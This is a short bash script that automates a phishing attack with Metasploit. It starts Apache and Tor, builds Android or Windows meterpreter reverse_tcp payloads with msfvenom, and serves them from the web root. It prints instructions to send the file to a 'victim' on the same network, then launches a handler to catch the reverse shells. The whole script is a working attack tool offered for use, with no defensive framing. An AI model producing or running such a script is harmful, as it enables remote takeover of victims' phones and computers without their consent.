#! /bin/bash
echo "********************  ************************"
echo "********************  ************************"
echo "********************  ************************"
echo "****************	       *********************"
echo "************		 *******************"
echo "*********			    ****************"
echo "       AUTOMATE MSF APACHE2 WEB PHISING       "
echo "*********                     ****************"
echo "************               *******************"
echo "****************         *********************"
echo "********************  ************************"
echo "********************  ************************"
echo "********************  ************************"
echo "YOU NEED TO BE ROOT"
echo " Note that this automation "
echo " does not involve firewall / privilege Escalation Detection "
echo " This tool has the ability to create shell on both android and windows "
echo " press 1 for android and 2 for windows "                     
read options                                                                  
service postgresql start                      
service tor start
service apache2 start
echo "enter your ip"
read  ipp 
touch m.rc       
echo use exploit/multi/handler >> m.rc                  
echo set payload android/meterpreter/reverse_tcp >> m.rc
echo set LHOST $ipp >> m.rc         
echo set LPORT 4444 >> m.rc                             
echo exploit >> m.rc         
touch mr.rc                 
echo use exploit/multi/handler >> mr.rc
echo set payload windows/meterpreter/reverse_tcp >> mr.rc
echo set LHOST $ipp >> mr.rc         
echo set LPORT 1234 >> mr.rc                             
echo exploit >> mr.rc         

if [ "$options" == "1" ];
then
	echo "send it to victim on same network "$ipp"/FILENAME.apk"
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$ipp LPORT=4444  R > /var/www/html/FILENAME.apk
        msfconsole -r m.rc                                       
fi
if [ "$options" == "2" ];
then 
	echo "send it to victim on same network "$ipp"/window.exe"
	msfvenom -p windows/meterpreter/reverse_tcp lhost=$ipp lport=1234 -f exe > /var/www/html/window.exe
	msfconsole -r mr.rc
fi
rm m.rc mr.rc
rm FILENAME.apk window.exe
